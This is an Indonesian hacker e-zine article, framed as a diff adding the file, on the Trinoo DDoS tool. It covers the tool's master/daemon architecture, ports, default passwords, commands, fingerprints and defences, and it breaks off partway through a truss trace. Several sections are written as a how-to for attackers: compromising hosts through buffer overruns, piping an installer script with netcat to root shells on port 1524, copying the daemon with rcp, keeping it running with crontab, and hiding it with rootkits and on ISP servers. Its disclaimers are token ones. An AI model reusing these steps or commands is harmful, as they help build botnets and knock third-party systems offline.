@@ -1,0 +1,1670 @@
+       
+
+        ____________________   ___ ___ ________   
+ 	\_   _____/\_   ___ \ /   |   \\_____  \  
+	 |    __)_ /    \  \//    ~    \/   |   \ 
+	 |        \\     \___\    Y    /    |    \
+	/_______  / \______  /\___|_  /\_______  /
+	        \/         \/       \/         \/ 
+
+
+					    .OR.ID
+ECHO-ZINE RELEASE
+       08
+
+Author: hilman_hands 
+Online @ www.echo.or.id :: http://ezine.echo.or.id
+
+
+*******************************************************************                                  
+            Distributed Denial Of Service Attack Tool :                                                    
+                     Jaringan Trinoo                                                        
+                      a.k.a, Trin00
+*******************************************************************
+
+Pembuatan artikel ini sebenarnya saya maksudkan hanya untuk 
+memperluas cakrawala penulis tentang sistem penggunaan dari
+tool DDOS ini, lalu penulis berpikir alangkah lebih baiknya 
+seandainya apa yang penulis dapatkan kemudian dipublikasikan 
+demi perluasan cakrawala temen-temen yang sering nongkrong di 
+situs-situs underground atau lebih luasnya mampu 
+memperkembangkan wawasan IT di Indonesia (gileeee bener.....). 
+Setelah saya melihat perkembangan dari pembahasan artikel yang 
+sering temen-temen buat di situs-situs underground, ternyata 
+pembahasan mengenai tool yang satu ini (DDOS) sangat minim 
+sekali, padahal apabila kita menengok berita-berita di situs 
+luar negeri banyak sekali korban yang berjatuhan akibat 
+digunakannya tool ini (mungkin anda pernah baca waktu lalu 
+di www.netcraft.com bahwa penyedia layanan internet terbesar 
+di jepang +++kalo gak salah baca+++ yaitu AKAMAI tumbang karena 
+serangan tool ini,atau apabila anda ingin baca lebih jauh tentang 
+maraknya serangan yang dilakukan oleh hacker / cracker dengan 
+menggunakan tool ini +++DDOS+++ terkini, anda bisa melihatnya 
+di www.ddosworld.com,tetapi yang sangat penulis sesalkan bahwa 
+di Indonesia atau bahkan di luar negeri sangat jarang sekali 
+terdapat artikel yang membahas tentang penggunaan dari tool ini 
+(hanya berita tentang situs-situs atau layanan jasa internet 
+yang jadi korban saja yang kita baca, tidak mengenai penggunaan
+tool ini), lalu penulis mencoba untuk browsing, membaca, meneliti 
+sendiri cara penggunaan tool ini,begitu juga penulis meneliti 
+selama berminggu-minggu tentang source code-nya, membahas tentang
+source code-nya melalui milis-milis luar negeri ataupun lokal 
+terutama milis-milis yang membahas tentang C programming, 
+pembahasan socket C programming, dll. dan yang sangat 
+membantu sekali bagi penulis tentang perluasan cakrawala penulis 
+terutama penggunaan dari tool DDOS ini, penulis dapatkan dari 
+DAVID DITTRICH, dan terus terang artikel ini sumber utamanya 
+didapat dari artikel yang di tulis oleh Dave Dittrich, dan 
+masih banyak sumber sekunder lainnya yang penulis dapatkan 
+selain dari david dittrich tersebut untuk penyempurnaan
+dari artikel ini. kayak skripsi aja yaaa........udah dulu deh 
+ceritanya...oke sekarang kita langsung membahas artikel ini.....
+
+Trinoo daemon yang original, koneksinya didasarkan pada UDP, 
+aksesnya dibatasi oleh remote command shell, tetapi apabila 
+anda ingin mengotomatisasikannya harus digunakan bersama dengan 
+sniffers (sebagai penghubung) untuk recovering sniffer log.
+
+Selama saya melakukan penelitian terhadap sistem intrusi ini, 
+instalasi jaringan trinoo telah saya buat dalam jaringan 
+komputer sendiri, operating sistem yang saya gunakan adalah 
+Redhat 6.0 dan solaris 2.5.1 +++banyak suka dukanya untuk 
+mendapatkan OS solaris ini begitupun instalasinya karena 
+minimnya pengetahuan penulis tentang OS ini...heheh++++ 
+(anda jangan coba-coba menginstalasi dalam komputer jaringan 
+orang lain…ok???).
+
+Apabila anda telah memodifikasi source code trinoo (a.k.a. 
+"trin00") ataupun anda mendownload trinoo yang bukan versi 
+aslinya tentu saja akan merubah setiap detil dalam pembahasan 
+dalam artikel ini, seperti prompt, password, commands, port 
+number TCP/UDP, atau metoda serangan yang didukung, signature, 
+feature, dan lain-lain.
+
+Seperti  pembahasan stacheldraht yang lalu, pembahasan kali 
+ini juga daemon telah di-compile dan di-run pada operating 
+sistem Solaris 2.5.1 dan redhat Linux 6.0. Master telah 
+di-compile dan di-run pada OS redhat Linux 6.0. Temen-temen 
+mungkin bisa mencobanya pada flatform yang lain…ataupun 
+seandainya temen-temen ingin menganalisanya juga ada baiknya 
+pake solaris 2.5.1 atau redhat 6.0, karena sudah teruji 
+khasiatnya….kayak iklan jamu aja yah….hehe.
+
+Jaringan trinoo sebenarnya bisa di-setup pada ratusan, atau 
+bahkan barangkali ribuan sistem yang terhubung ke Internet 
+yang telah di-compromised (yang telah ditaklukkan dan telah 
+anda atur sedemikian rupa, tentu saja untuk kepentingan anda 
+sendiri) oleh exploitasi remote buffer overrun. Akses ke 
+sistem ini sebaiknya atau kalo boleh seharusnya  
+"diabadikan" oleh instalasi berbagai "pintu belakang 
+atau backdoor" bersama dengan trinoo daemons.
+
+Apabila kita melongok pada tahun 1999 tepatnya tanggal 17 
+agustus, Jaringan trinoo yang sedikitnya di-compromise 
+pada sekitar 227-114 sistem  telah digunakan untuk 
+menyerang sistem tunggal di Universitas Minnessota 
+dengan menggunakan style flooding attack, adanya serangan 
+terhadap target network tersebut menyebabkan sistem di 
+Universitas Minnesota tak dapat dipakai selama dua hari 
+lebih. Selama para sistem administrator merespon terhadap 
+adanya serangan ini, arus besar juga tercatat telah 
+membanjiri sedikitnya enam belas sistem lain, 
+beberapa di luar  AS. 
+
+
+LANGKAH-LANGKAH DALAM MENGINSTALASI JARINGAN TRINOO 
+*******************************************************************
+
+Tipikal instalasi pada DDoS attack tool trinoo mungkin seperti di 
+bawah ini :
+1). Cobalah anda mempunyai sebuah account pada sistem  lain 
+(jangan coba-coba mencuri account dan mengunakan tool ini pada 
+sistem orang lain yang ilegal, karena artikel ini hanya digunakan 
+untuk bahan pembelajaran saja +++tetapi cracker biasanya nyolong 
+account super user di remote sistem,udah banyak khan tutorial 
+untuk nyolong account tersebut? Tetapi kadangkala tutorialnya gak
+ngejelasin soal sistem kerja dari tool-nya sendiri, yang lebih 
+parah hacker/craker newbies gak melakukan proses hacking terhadap 
+sistem target/telaah terhadap sistem target…kalo asal ngejalanin
+tool…gimana bisa maju…tul gak?+++. Akan lebih baik apabila account 
+tersebut tidak membatasi ruang gerak bagi pemakainya atau anda 
+mempunyai account "Super User", dan akan lebih baik pula apabila 
+anda mempunyai koneksi high-bandwith agar proses transfer file 
+lebih cepat). maksudnya bahwa sebuah account pada sistem yang 
+lain tersebut dapat digunakan sebagai tempat penyimpanan versi 
+pre-compiled scanning tool, attack tool (seperti: buffer overrun 
+exploit), root kit dan sniffer, program trinoo daemon dan master, 
+daftar host yang vulnerable dan daftar  host yang sebelumnya
+telah anda kuasai yang dapat kita compromised dengan sistem kita, 
+dan lain lain.
+
+2). Suatu scanning tool digunakan untuk meneliti cakupan network 
+blocks yang luas/besar untuk mengidentifikasi target yang potensial. 
+Target sebaiknya meliputi sistem yang menjalankan berbagai service 
+atau yang memiliki security bug yang secara remote dapat di 
+exploitasi dengan buffer overflow,seperti   oleh wu-ftpd, 
+service RPC untuk "cmsd", "statd", "ttdbserverd", "amd", 
+dan lain lain. Operating System yang akan menjadi target 
+sebaiknya dicari yang ber-flatform Sun Solaris 2.x atau linux 
+(pokoknya OS yang dapat menjalankan "root kits" untuk
+menyembunyikan back door, network sniffer, dan lain-lain), 
+kemudian account yang telah kita dapatkan (sebaiknya jangan 
+mencuri)pada arsitektur yang lainnya dapat kita gunakan 
+untuk tool-tool caching dan log files.
+
+3) Sebuah daftar dari system yang vulnerable kemudian digunakan 
+untuk membuat sebuah script yang melaksanakan exploitasi (tentu 
+saja setelah di-compromise), men-setup command shell yang dapat 
+berjalan apabila menggunakan account root yang listen pada port 
+TCP (biasanya menggunakan 1524/tcp, service port "ingreslock"), 
+dan konek pada port tersebut untuk mengkonfirmasikan sukses
+atau tidaknya eksploitasi. Dalam beberapa hal, sebuah pesan 
+e-mail dikirim ke sebuah account yang menggunakan service web 
+email gratis untuk mengkonfirmasikan sistem yang manakah yang
+telah di-compromise. Hasilnya adalah daftar dari system "yang 
+telah dikuasai" yang siap untuk dipasangi backdoor, sniffers, 
+atau trinoo daemons atau master.
+
+4). Dari daftar sistem yang telah di compromise ini, subsets-kan 
+dengan arsitektur yang diinginkan yang telah kita pilih untuk 
+jaringan trinoo. Buat dan simpanlah pre-compiled binary dari  
+trinoo daemon tersebut pada sebuah account yang telah kita 
+dapatkan (tentu saja pada system yang terhubung dengan internet).
+
+5). Kemudian jalankan Script  tersebut, dimana script ini akan 
+mengambil dari daftar system "yang telah dikuasai" dan kita 
+sebenarnya masih bisa membuat script yang lain untuk 
+meng-otomatisasikan proses instalasi, dan menjalankan setiap 
+instalasi di background untuk multitasking maksimum.
+
+Script ini menggunakan  "Netcat" ("nc") untuk pemipaan suatu 
+shell script terhadap shell root yang listening, dalam hal ini, 
+menggunakan port 1524/tcp, perhatikan contoh di bawah ini :
+*******************************************************************
+./trin.sh | nc 208.aaa.24.14 1524 &
+./trin.sh | nc 208.aaa.125.18 1524 &
+./trin.sh | nc 208.aaa.204.54 1524 &
+./trin.sh | nc 208.aaa.229.49 1524 &
+./trin.sh | nc 208.bbb.2.80 1524 &
+./trin.sh | nc 208.bbb.2.81 1524 &
+./trin.sh | nc 208.bbb.2.238 1524 &
+./trin.sh | nc 208.ccc.12.22 1524 &
+./trin.sh | nc 208.ccc.12.50 1524 &
+ . . .
+ . . .
+*******************************************************************
+Script " trin.sh", yang outputnya telah  dipipakan ke  sistem-sistem 
+ini, akan terlihat seperti di bawah ini:
+*******************************************************************
+echo "rcp 192.168.0.1:leaf /usr/sbin/rpc.listen"
+echo "echo rcp is done moving binary"
+
+echo "chmod +x /usr/sbin/rpc.listen"
+
+echo "echo launching trinoo"
+echo "/usr/sbin/rpc.listen"
+
+echo "echo \* \* \* \* \* /usr/sbin/rpc.listen > cron"
+echo "crontab cron"
+echo "echo launched"
+echo "exit"
+*******************************************************************
+Tergantung seberapa dekatnya crontab files dapat dimonitor, atau 
+jika crontab files kita gunakan semuanya, hal ini mungkin dapat 
+dengan mudah di deteksi. Jika cron tidak kita gunakan sama sekali 
+oleh user ini (biasanya root), hal ini mungkin saja tidak akan 
+terdeteksi sama sekali.
+
+6). Untuk tahap ini optional. Kita dapat menginstal "root kit" 
+ke sebuah sistem untuk menyembunyikan kehadiran program, file, 
+dan koneksi jaringan. Untuk system master, hal tersebut sangat 
+penting sekali, karena sistem master ini adalah sebuah kunci 
+jaringan trinoo. Haruslah dicatat bahwa dalam banyak kasus, 
+master-master biasanya di-set / diinstalasi pada Internet Service 
+Provider (ISP=penyedia layanan internet dan biasanya juga sebagai 
+primary name server host), yang secara normal / biasanya mempunyai 
+high packet traffic (paket lalu lintas yang sangat besar) dan 
+mempunyai koneksi TCP dan UDP yang sangat banyak, yang akan secara 
+efektif dapat menyembunyikan trinoo master  berhubungan dengan
+adanya lalu lintas atau aktivitas yang sangat banyak tersebut, 
+dan mungkin tidak akan terdeteksi. (sebuah fakta bahwa primary name 
+server juga akan cenderung untuk membuat pemilik untuk mematikan 
+system yang terhubung ke internet seandainya mereka mulai curiga 
+adanya aktivitas yang berhubungan dengan denial of service.)
+
+Root kit juga bisa digunakan pada sistem yang menjalankan sniffers, 
+bersama-sama dengan program seperti "hunt" ( TCP/IP session hijacking 
+tool) dimana tool tersebut bisa digunakan untuk mem-burrow lebih lanjut 
+ke dalam jaringan lain secara langsung, daripada menggunakan exploit 
+remote buffer overrun (e.g., untuk menemukan sites untuk men-set 
+tempat penyimpanan file baru, dan lain-lain).
+
+Untuk informasi lebih lanjut mengenai "root kits" atau anda ingin 
+mengetahui tentang segala sesuatunya, bisa anda lihat di (agar anda 
+dapat lebih mengerti tentang artikel ddos tool ada baiknya anda 
+mengetahui tentang system kerja daripada root kit ini): 
+http://staff.washington.edu/dittrich/misc/faqs/rootkits.faq
+
+
+JARINGAN TRINOO
+*******************************************************************
+
+Network Trinoo : attacker(s)-->master(s)-->daemon(s)-->victim(s.
+Jaringan trinoo terdiri dari  master server ("master.c") dan trinoo 
+daemon ("ns.c"). Jaringan trinoo akan terlihat seperti di bawah ini:
+
+                 +----------+            +----------+
+                 | attacker |            | attacker |
+                 +----------+            +----------+
+                      |                       |
+          ...--+------+---------------+-------+----------+--...
+               |                      |                  |
+               |                      |                  |
+         +----------+           +----------+        +----------+
+         |  master  |           |  master  |        |  master  |
+         +----------+           +----------+        +----------+
+              |                      |                    |
+              |                      |                    |
+... ---+------+--------+-------------+---+----------+-----+----------+--...
+       |               |                 |          |                |
+       |               |                 |          |                |
+  +--------+      +--------+        +--------+  +--------+       +--------+
+  | daemon |      | daemon |        | daemon |  |daemon  |       | daemon |
+  +--------+      +--------+        +--------+  +--------+       +--------+
+
+Attacker (bisa satu atau lebih) dapat mengendalikan satu atau lebih 
+"master" server, masing-masing "master" server dapat mengendalikan 
+banyak  "daemons" (di dalam kodenya dikenal/diketahui sebagai "Bcast", 
+atau "broadcast".) Daemons disana dapat diinstruksikan untuk 
+mengkoordinir suatu paket serangan terhadap satu atau lebih sistem korban.
+
+Untuk keperluan semua hal tersebut di atas yang dibutuhkan selanjutnya 
+adalah kemampuan untuk menetapkan suatu koneksi TCP  terhadap host 
+master dengan menggunakan "telnet" dan password kepada master server 
+agar mampu merangkum semua jaringan yang luas agar dapat dikoordinasi  
+untuk melakukan serangan denial of service.
+
+
+PORT-PORT UNTUK MELAKUKAN KOMUNIKASINYA
+*******************************************************************
+
+	Attacker ke Master(s):	27665/tcp
+    	Master ke daemon (s):	27444/udp
+    	Daemon ke Master (s):	31335/udp
+
+Remote control dari trinoo master dapat dilakukan melalui suatu 
+koneksi TCP dengan port 27665/tcp. Setelah terkoneksi, user harus 
+memberikan password yang sesuai ("betaalmostdone"). Jika sebuah 
+koneksi lain telah terhubung ke server dan telah di-authenticate, 
+suatu peringatan akan dikirim kepadanya dengan alamat IP dari 
+host yang terhubung (hal tersebut muncul untuk memberitahukan 
+bahwa terdapat sebuah bug yang melaporkan adanya alamat IP yang 
+salah, tetapi sebuah peringatan tersebut masih tetap 
+dikomunikasikan). Dengan adanya hal tersebut sebaiknya 
+secepatnya diperbaiki dan kemudian hal tersebut akan 
+memberikan waktu kepada attacker untuk membersihkan 
+dan menutupi jejaknya.
+
+Komunikasi antara trinoo master ke daemons adalah melalui paket 
+UDP pada port 27444/udp. Bentuk Perintahnya dipisahkan oleh spasi, 
+formatnya seperti di bawah ini :
+
+		arg1 password arg2
+
+Default password untuk commands adalah "l44adsl", dan hanya 
+command lines yang berisi substring  "l44"-lah yang akan  diproses.
+
+Komunikasi  antara trinoo daemons ke trinoo master adalah melalui 
+paket UDP pada port 31335/udp.
+
+Ketika daemon start, pada awalnya akan mengirimkan string "*HELLO*" 
+kepada master, yang mengatur daftar daemon aktif yang dapat 
+dikontrolnya (paket tersebut dapat ditangkap dengan menggunakan 
+"sniffit"), seperti dibawah ini :
+
+*******************************************************************
+UDP Packet ID (from_IP.port-to_IP.port): 192.168.0.1.32876-10.0.0.1.31335
+45 E 00 . 00 . 23 # B1 . 5D ] 40 @ 00 . F8 . 11 . B9 . 27 . C0 . A8 . 00 . 01 .
+0A . 00 . 00 . 01 . 80 . 6C l 7A z 67 g 00 . 0F . 06 . D4 . 2A * 48 H 45 E 4C L
+4C L 4F O 2A *
+*******************************************************************
+
+Jika trinoo master mengirimkan sebuah perintah "png" terhadap daemon 
+pada port 27444/udp, trinno daemon akan me-reply kepada server dengan 
+string "PONG" pada port 31335/udp, coba temen-temen perhatikan 
+yang ditangkap oleh "sniffit" :
+
+*******************************************************************
+UDP Packet ID (from_IP.port-to_IP.port): 10.0.0.1.1024-192.168.0.1.27444
+45 E 00 . 00 . 27 ' 1A . AE . 00 . 00 . 40 @ 11 . 47 G D4 . 0A . 00 . 00 . 01 .
+C0 . A8 . 00 . 01 . 04 . 00 . 6B k 34 4 00 . 13 . 2F / B7 . 70 p 6E n 67 g 20  
+6C l 34 4 34 4 61 a 64 d 73 s 6C l
+
+UDP Packet ID (from_IP.port-to_IP.port): 192.168.0.1.32879-10.0.0.1.31335
+45 E 00 . 00 . 20   13 . 81 . 40 @ 00 . F8 . 11 . 57 W 07 . C0 . A8 . 00 . 01 .
+0A . 00 . 00 . 01 . 80 . 6F o 7A z 67 g 00 . 0C . 4E N 24 $ 50 P 4F O 4E N 47 G
+*******************************************************************
+
+
+PROTEKSI PASSWORD
+*******************************************************************
+
+Trinoo master dan trinoo daemon kedua-duanya diproteksi oleh password 
+untuk menjaga agar system administrator (atau group hacker yang lain) 
+mengambil alih kontrol jaringan trinoo. Password-password tersebut 
+dienkripsi dengan menggunakan crypt () style password. Enkripsi tersebut  
+digunakan di dalam symmetric fashion, di mana password yang dienkripsi 
+di-compile ke dalam master dan daemon dan digunakan untuk membandingkan 
+antara versi clear-text dari password yang dikirim lewat jaringan (versi 
+yang sekarang tidak meng-enkripsi sesi yang aktual, sehingga clear-text 
+password tersebut dapat terlihat dalam transit dan sesi master 
+controlnya adalah tunduk terhadap TCP session highjacking).
+
+Ketika inisialisasi mulai berjalan atau ketika program mulai dijalankan, 
+kita akan dihadapkan pada master daemon prompt, menunggu diberikannya 
+sebuah password. Apabila password yang sesuai tidak diterima atau apabila 
+temen-temen memberikan password yang salah maka program akan keluar. Jika 
+password yang sesuai kita berikan, maka program akan memberitahukan,
+dan proses berlanjut dilatar belakang, lalu program keluar, lihatlah 
+contoh di bawah ini:
+
+	# ./master
+    	?? passwordsalah
+    	# 
+       . . .
+
+    	# ./master
+    	?? gOrave
+    	trinoo v1.07d2+f3+c [Sep 26 2004:10:09:24]
+    	# 
+
+Demikian juga, ketika kita konek ke port remote command ( default 
+27665/tcp), kita harus pula memberi password, coba lihat contoh 
+di bawah ini:
+
+    attacker$ telnet 10.0.0.1 27665
+    Trying 10.0.0.1
+    Connected to 10.0.0.1
+    Escape character is '^]'.
+    passwordsalah
+    Connection closed by foreign host.
+     . . .
+
+    attacker$ telnet 10.0.0.1 27665
+    Trying 10.0.0.1
+    Connected to 10.0.0.1
+    Escape character is '^]'.
+    betaalmostdone
+    trinoo v1.07d2+f3+c..[rpm8d/cb4Sx/]
+
+    trinoo>
+
+Perintah-perintah tertentu yang dikirim kepada trinoo daemons oleh 
+master, juga diproteksi oleh password. Password yang dikirim oleh 
+master ke daemon juga dalam format clear text.
+
+Default password-nya adalah :
+
+"l44adsl"	     Password trinoo daemon.
+"gOrave"	     Password startup trinoo master server("??" prompt)
+"betaalmostdone" Password remote interface trinoo master
+"killme"	     Password trinoo master untuk mengontrol "mdie" command
+
+
+PERINTAH-PERINTAH YANG DIDUKUNG OLEH MASTER
+*******************************************************************
+
+Perintah-perintah yang didukung oleh trinoo master, seperti 
+dibawah ini :
+
+die		Untuk men-shut down master
+
+quit		Untuk log off master
+
+mtimer N	Untuk menset/mengatur waktu DoS ke N detik. N bisa 
+		antara 1 sampai 1999 detik. Jika N adalah < 1, 
+		defaultnya sampai 300. jika N adalah > 2000, 
+		defaultnya sampai 500.
+
+dos IP	Untuk melakukan serangan DoS terhadap alamat IP 
+		yang telah ditetapkan.Sebuah perintah ("aaa 144adsl IP") 
+		dikirimkan kepada setiap Bcast host (i.e., trinoo daemons) 
+		untuk melakukan serangan DoS terhadap alamat IP yang 
+		telah ditetapkan.	
+
+mdie pass	Untuk mendisable semua Bcast hosts, jika diberikan 
+		password yang benar.Sebuah perintah dikirimkan 
+		("d1e 144adsl") kepada setiap Bcast host untuk 
+		men-shutdown.Sebuah password terpisah diperlukan 
+		untuk perintah ini.
+
+mping		Untuk mengirimkan perintah PING ("png 144adsl") 
+		ke setiap Bcast host yang aktif.
+
+mdos   	Multiple DoS. Untuk mengirimkan perintah multiple DoS 
+		("xyz 144adsl 123:ip1:ip2:ip3") ke setiap Bcast host.
+
+info		Info versi dan info tentang compilasi, contoh :
+		This is the "trinoo" AKA DoS Project master server 
+		version v1. 07d2+f3+c Compiled 15:08:41 Sept. 16 2004
+
+msize		Men-set buffer size untuk paket yang dikirim 
+		selama DoS attack.
+
+nslookup host 	
+		Untuk melakukan name service lookup (nslookup) terhadap 
+		spesifik host dari perspektif host dimana master 
+		server tersebut berjalan.
+
+killdead	Untuk membuang semua Bcast host yang mati dengan 
+		pertama kali mengirimkan paket terhadap semua Bcast 
+		host dengan sebuah perintah ("shi 144adsl") yang 
+		menyebabkan semua aktif daemon me-reply dengan sebuah 
+		inisial string "*HELLO*", yang kemudian me-rename 
+		file Bcast (dengan extensi "-b"). Hal tersebut akan 
+		menyebabkan re-inisialisasi ketika paket "*HELLO*" 
+		diterima. 
+
+usebackup	Men-switch backup file Bcast yang dibuat oleh  
+		perintah " killdead".
+
+bcast		Daftar semua Bcast host yang aktif.
+
+help [cmd]	Help file (memberikan daftar dari perintah yang 
+		didukung).
+
+mstop		Untuk men-stop DoS attack (tidak diimplementasikan,
+		tapi terdaftar dalam help command).
+
+
+PERINTAH-PERINTAH YANG DIDUKUNG OLEH DAEMON
+*******************************************************************
+
+Trinno daemon mendukung command-command sebagai berikut :
+
+aaa pass IP	Untuk men-DoS alamat IP yang telah ditentukan. Mengirimkan 
+		paket-paket UDP ke port UDP secara random (0-65534) 
+		terhadap alamat IP yang telah ditentukan berdasarkan 
+		periode waktu (defaultnya 120 detik, atau 1 - 1999 detik 
+		untuk men-setupnya menggunakan perintah "bbb"). 
+		Untuk ukuran paket yang akan dikirim diset dengan 
+		perintah "rsz", atau dengan menggunakan default 
+		size-nya yaitu 1000 byte.
+
+bbb pass N	Men-set batas waktu (dalam detik) untuk DoS attack.
+
+shi pass	Untuk mengirimkan string "*HELLO*" terhadap daftar 
+		master server yang telah di-compile pada port 31335/udp.
+
+png pass	Untuk mengririm String "PONG" terhadap master 
+		menggunakan port 31335/udp.
+
+d1e pass	Men-shut down trinoo daemon.
+
+rsz N		Untuk men-set ukuran buffer untuk DoS attack ke N bytes.
+
+xyz pass 123:ip1:ip2:ip3
+		Multiple DoS. Sama seperti yang digunakan pada perintah 
+		"aaa", tetapi disini hanya untuk multiple IP address.
+
+Coba anda lihat perintah-printah dibawah ini (anda harus menggunakan 
+opsi "--bytes=3" dari GNU STRINGS (1)) :
+*******************************************************************
+	# strings --bytes=3 ns | tail -15
+	socket
+	bind
+	recvfrom
+	l44
+	%s %s %s
+	aIf3YWfOhw.V.
+	aaa
+	bbb
+	shi
+	png
+	PONG
+	d1e
+	rsz
+	xyz
+	*HELLO*
+*******************************************************************
+
+
+FINGERPRINTS
+*******************************************************************
+
+Metoda yang digunakan untuk menginstal trinoo daemon pada beberapa 
+sistem menggunakan crontab entry untuk memulai daemon pada tiap 
+menitnya. Crontab file akan menempatkan masukan ini :
+
+    * * * * * /usr/sbin/rpc.listen
+
+Program master akan menciptakan sebuah file (nama defaultnya "...") 
+yang berisi set dari Bcast host. Jika perintah "killdead" digunakan, 
+sebuah perintah "shi" akan dikirim ke semua daemon yang terdaftar 
+di "...", yang menyebabkan daemon-daemon tersebut mengirimkan 
+inisial string "*HELLO*" ke semua master. Kemudian daftar yang 
+sekarang akan dinamai kembali (defaultnya "...-b") dan sebuah 
+daftar baru kemudian akan menghasilkan tiap-tiap sisa daemon yang 
+hidup dan akan mengirimkan string "*HELLO*".
+
+Source code ("master.c") berisi seperti line berikut ini :
+*******************************************************************
+. . .
+/* crypt key encrypted with the key 'bored'(so hex edit cannot 
+   get key easily?)comment out for no encryption... */
+#define CRYPTKEY "ZsoTN.cq4X31"
+. . .
+*******************************************************************
+
+Jika program telah di compile dengan CRYPTKEY define, alamat 
+IP dari Bcast host akan dienkripsi menggunakan algoritma 
+Blowfish encryption.
+
+*******************************************************************
+    # ls -l ... ...-b
+    -rw-------   1 root     root           25 Sep 26 14:46 ...
+    -rw-------   1 root     root           50 Sep 26 14:30 ...-b
+    # cat ...
+    JPbUc05Swk/0gMvui18BrFH/
+    # cat ...-b
+    aE5sK0PIFws0Y0EhH02fLVK.
+    JPbUc05Swk/0gMvui18BrFH/
+*******************************************************************
+
+Apabila kita asumsikan di dalam sistem tersebut tidak kita tanam 
+"root kit" untuk menyembunyikan proses, master server akan 
+menunjukkan fingerprint network soket berikut ini :
+
+*******************************************************************
+# netstat -a --inet
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 *:27665                 *:*                     LISTEN      
+. . .
+udp        0      0 *:31335                 *:*                                 
+. . .
+
+# lsof | egrep ":31335|:27665"
+master   1292     root    3u  inet       2460              UDP *:31335 
+master   1292     root    4u  inet       2461              TCP *:27665 (LISTEN)
+
+# lsof -p 1292
+COMMAND  PID USER   FD   TYPE DEVICE    SIZE  NODE NAME
+master  1292 root  cwd    DIR    3,1    1024 14356 /tmp/...
+master  1292 root  rtd    DIR    3,1    1024     2 /
+master  1292 root  txt    REG    3,1   30492 14357 /tmp/.../master
+master  1292 root  mem    REG    3,1  342206 28976 /lib/ld-2.1.1.so
+master  1292 root  mem    REG    3,1   63878 29116 /lib/libcrypt-2.1.1.so
+master  1292 root  mem    REG    3,1 4016683 29115 /lib/libc-2.1.1.so
+master  1292 root    0u   CHR    4,1          2967 /dev/tty1
+master  1292 root    1u   CHR    4,1          2967 /dev/tty1
+master  1292 root    2u   CHR    4,1          2967 /dev/tty1
+master  1292 root    3u  inet   2534           UDP *:31335 
+master  1292 root    4u  inet   2535           TCP *:27665 (LISTEN)
+*******************************************************************
+
+Sistem yang menjalankan daemon akan menunjukkan hal berikut ini :
+
+*******************************************************************
+# netstat -a --inet
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+. . .
+udp        0      0 *:1024                  *:*                                 
+udp        0      0 *:27444                 *:*                                 
+. . .
+
+# lsof | egrep ":27444"
+ns       1316     root    3u  inet       2502              UDP *:27444 
+
+# lsof -p 1316
+COMMAND  PID USER   FD   TYPE DEVICE    SIZE   NODE NAME
+ns      1316 root  cwd    DIR    3,1    1024 153694 /tmp/...
+ns      1316 root  rtd    DIR    3,1    1024      2 /
+ns      1316 root  txt    REG    3,1    6156 153711 /tmp/.../ns
+ns      1316 root  mem    REG    3,1  342206  28976 /lib/ld-2.1.1.so
+ns      1316 root  mem    REG    3,1   63878  29116 /lib/libcrypt-2.1.1.so
+ns      1316 root  mem    REG    3,1 4016683  29115 /lib/libc-2.1.1.so
+ns      1316 root    0u   CHR    4,1           2967 /dev/tty1
+ns      1316 root    1u   CHR    4,1           2967 /dev/tty1
+ns      1316 root    2u   CHR    4,1           2967 /dev/tty1
+ns      1316 root    3u  inet   2502            UDP *:27444 
+ns      1316 root    4u  inet   2503            UDP *:1024
+*******************************************************************
+
+
+PERTAHANAN
+*******************************************************************
+
+Tentu saja, pertahanan yang terbaik adalah mencegah adanya seseorang 
+yang nge-rooted dan meng-intrusi system, yang selanjutnya mereka 
+meng-compromise system anda dengan mereka (attacker), itulah saran 
+pokok penulis, sehingga tidak ada celah manapun bagi attacker untuk 
+menginstal trinoo master/daemon. Apabila kita membayangkan sesuatu 
+yang ideal, maka salah satu jalan terbaik (seperti yang sering kita 
+baca/dengar….dan ini sangat membosankan…!!!) adalah semua system 
+harus di patched, dimonitor, menggunakan IDS (intrusion detection 
+system) dan firewall yang akan mendeteksi  dan menolak paket-paket.
+Tetapi semua hal tersebut tidak 100% akan menjamin bahwa system 
+anda akan selamat.
+
+Mungkin saja network anda telah tertanam beberapa trinoo daemons 
+yang berjalan dan disiapkan untuk melakukan DoS terhadap system 
+lain. Lalu  bagaimana mereka dapat dideteksi atau dilumpuhkan?
+
+Karena program menggunakan nomor port UDP yang tinggi untuk 
+melakukan komunikasi dan penyerangannya, hal tersebut akan 
+sangat menyulitkan (jika tidak mustahil) untuk membloknya 
+tanpa mematahkan program yang menggunakan UDP pada port number 
+yang tinggi tersebut.
+
+Metode yang paling mudah untuk mendeteksi kehadiran trinoo 
+master atau daemon adalah dengan memonitoring semua paket 
+UDP pada segmen Ethernet sharing dan anda bisa 
+melihatnya/mencarinya pada tale sign ketika mereka 
+melakukan komunikasi antara master dan daemon, seperti yang 
+akan saya gambarkan pada artikel ini pada tempat lainnya. 
+Sayangnya, pendeteksian ini hanya bisa dilakukan selama 
+terjadi suatu serangan atau jika terjadi suatu network 
+degradation ataupun jika ada laporan dari victim sites 
+tentang adanya serangan DoS terhadapnya. 
+
+Jika suatu sistem dicurigai memiliki trinoo daemon yang 
+secara aktif menyerang, output dari program "truss" nya 
+solaris dari daemon yang berjalan akan menunjukkan output 
+seperti di bawah ini :
+
+*******************************************************************
+ . . .
+getmsg(3, 0xEFFFF830, 0xEFFFF83C, 0xEFFFF81C)	= 0
+getmsg(3, 0xEFFFF830, 0xEFFFF83C, 0xEFFFF81C) (sleeping...)
+getmsg(3, 0xEFFFF830, 0xEFFFF83C, 0xEFFFF81C)	= 0
+time()						= 938385467
+open("/dev/udp", O_RDWR)			= 5
+ioctl(5, I_PUSH, "sockmod")			= 0
+ioctl(5, I_STR, 0xEFFFF748)			= 0
+ioctl(5, I_SETCLTIME, 0xEFFFF7FC)		= 0
+ioctl(5, I_SWROPT, 0x00000002)			= 0
+sigprocmask(SIG_SETMASK, 0xEFFFF7EC, 0xEFFFF7DC) = 0
+ioctl(5, I_STR, 0xEFFFF660)			= 0
+sigprocmask(SIG_SETMASK, 0xEFFFF7DC, 0xEFFFF7B8) = 0
+sigprocmask(SIG_BLOCK, 0xEFFFF548, 0xEFFFF5C0)	= 0
+ioctl(5, I_STR, 0xEFFFF548)			= 0
+sigprocmask(SIG_SETMASK, 0xEFFFF5C0, 0x00000000) = 0
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
+putmsg(5, 0xEFFFF83C, 0xEFFFF7A0, 0)		= 0
+time()						= 938385467
